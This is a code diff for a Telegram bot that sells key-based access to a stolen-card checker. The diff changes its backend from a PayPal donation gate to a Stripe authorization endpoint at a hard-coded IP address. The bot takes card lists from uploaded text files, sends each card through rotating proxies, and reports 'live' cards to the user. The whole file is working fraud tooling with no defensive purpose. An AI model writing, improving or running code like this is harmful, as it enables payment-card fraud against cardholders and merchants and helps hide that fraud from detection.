@@ -51,7 +51,7 @@ async def is_premium(user_id):
 
 async def generate_key(days: int = 30):
     import secrets
-    key = "GIVEWP-" + secrets.token_hex(8).upper()
+    key = "STRIPE-" + secrets.token_hex(8).upper()
     data = await load_json(KEYS_FILE)
     data[key] = {"days": days, "used": False}
     await save_json(KEYS_FILE, data)
@@ -72,35 +72,39 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== CHECKER WITH FULL LOGS ==================
+# ================== FIXED CHECKER ==================
 async def check_card(card: str):
     current_time = datetime.now().strftime('%H:%M:%S')
-    print(f"\n[{current_time}] {'='*50}")
-    print(f"[{current_time}] CHECKING CARD: {card}")
+    print(f"[{current_time}] CHECKING → {card}")
 
     try:
         proxy = random.choice(PROXIES)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
-        print(f"[{current_time}] PROXY USED: {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
-        url = f"http://138.128.240.15:8024/paypal_1?cc={card}"
-        print(f"[{current_time}] API CALL: {url}")
+        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}"
 
         async with aiohttp.ClientSession() as session:
             async with session.get(url, proxy=proxy_url, timeout=40) as r:
                 text = await r.text()
-                print(f"[{current_time}] STATUS CODE: {r.status}")
-                print(f"[{current_time}] FULL RESPONSE: {text[:600]}")
+                print(f"[{current_time}] STATUS: {r.status}")
+                print(f"[{current_time}] RESPONSE: {text}")
 
-                if r.status == 200 and any(x in text.upper() for x in ["ORDER APPROVED", "APPROVED", "SUCCESS", "CHARGED"]):
-                    print(f"[{current_time}] ✅ LIVE HIT DETECTED!")
-                    return {"status": "Approved", "response": "Charged $1"}
-                else:
+                lower = text.lower()
+
+                if "your card was declined" in lower or "declined" in lower:
                     print(f"[{current_time}] ❌ DECLINED")
                     return {"status": "Declined", "response": "Declined"}
 
+                elif "approved" in lower or "success" in lower or "charged" in lower:
+                    print(f"[{current_time}] ✅ CARD APPROVED / AUTH HIT")
+                    return {"status": "Approved", "response": "Card Approved / Auth Hit"}
+
+                else:
+                    print(f"[{current_time}] ❌ UNKNOWN RESPONSE")
+                    return {"status": "Declined", "response": "Declined"}
+
     except Exception as e:
-        print(f"[{current_time}] ❌ ERROR: {e}")
+        print(f"[{current_time}] ERROR: {e}")
         return {"status": "Declined", "response": "Error"}
 
 async def send_approved(event, card):
@@ -108,8 +112,8 @@ async def send_approved(event, card):
 **Approved ✅**
 ━━━━━━━━━━━━━
 [ϟ] 𝗖𝗖 - `{card}`
-[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : Charged $1
-[ϟ] 𝗚𝗮𝘁𝗲 - PayPal Donate
+[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : Card Approved / Auth Hit
+[ϟ] 𝗚𝗮𝘁𝗲 - Stripe Auth
 ━━━━━━━━━━━━━
 """
     await event.reply(msg)
@@ -119,7 +123,7 @@ async def send_approved(event, card):
 async def start(event):
     if not await is_premium(event.sender_id):
         return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY`")
-    await event.reply("**🔥 PayPal Checker**\nSend `.txt` file")
+    await event.reply("**🔥 Stripe Checker**\nSend `.txt` file")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
 async def genkey(event):
@@ -173,7 +177,7 @@ async def txt_handler(event):
         await asyncio.sleep(5)
 
 async def main():
-    print("🚀 Bot Started - FULL LOGS ENABLED")
+    print("🚀 Bot Started")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
